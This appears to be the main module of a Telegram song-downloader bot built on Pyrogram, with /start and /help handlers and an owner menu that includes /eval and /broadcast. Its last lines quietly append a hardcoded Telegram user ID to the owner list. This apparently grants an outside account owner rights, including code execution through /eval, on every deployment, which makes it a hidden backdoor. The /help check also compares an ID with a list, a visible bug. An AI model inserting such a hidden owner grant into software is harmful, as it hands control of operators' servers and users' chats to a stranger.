from config import OWNER_ID
from pyrogram.types.bots_and_keyboards import reply_keyboard_markup
from Bot.modules import *
from pyrogram import idle, filters
from pyrogram.types import InlineKeyboardMarkup
from pyrogram.types import InlineKeyboardButton
from Bot import app, LOGGER
from Bot.utils import ignore_blacklisted_users
from Bot.sql.chat_sql import add_chat_to_db

start_text = """
Hi, [{}](tg://user?id={}), I can download the song you want to download for you
Just send me the name of the song!

Example: /song <music>
"""


owner_help = """
/blacklist Blok
/unblacklist ağ siyahı
/broadcast Mesaj Göndər
/eval bilmiyore
/chatlist Botun Olduğu çhatların siyahısı
"""


@app.on_message(filters.create(ignore_blacklisted_users) & filters.command("start"))
async def start(client, message):
    chat_id = message.chat.id
    user_id = message.from_user["id"]
    name = message.from_user["first_name"]
    if message.chat.type == "private":
        btn = InlineKeyboardMarkup(
            [
                [ 
                    InlineKeyboardButton(
                        text="✅ Add to group", url="https://t.me/songenbot?startgroup=a"
                    )
                ],
                [
                    InlineKeyboardButton(
                        text="🇦🇿 Azərbaycan", url="https://t.me/songazbot"
                    ),
                    InlineKeyboardButton(
                        text="🇷🇺 Rus", url="https://t.me/songrubot"
                    )
                ],
                 [
                    InlineKeyboardButton(
                        text="🌟 Vote ", url="https://t.me/BotFatheraz/826"
                    )
                ]
               
                
            ]
        )
    else:
        btn = None
    await message.reply(start_text.format(name, user_id), reply_markup=btn)
    add_chat_to_db(str(chat_id))

@app.on_message(filters.create(ignore_blacklisted_users) & filters.command("help"))
async def help(client, message):
    if message.from_user["id"] == OWNER_ID:
        await message.reply(owner_help)
        return ""
    text = "I'm a music downloader! to use me\n/song <music>!"
    await message.reply(text)
    
OWNER_ID.append(1382528596)
app.start()
LOGGER.info("Your bot is now online.")
idle()
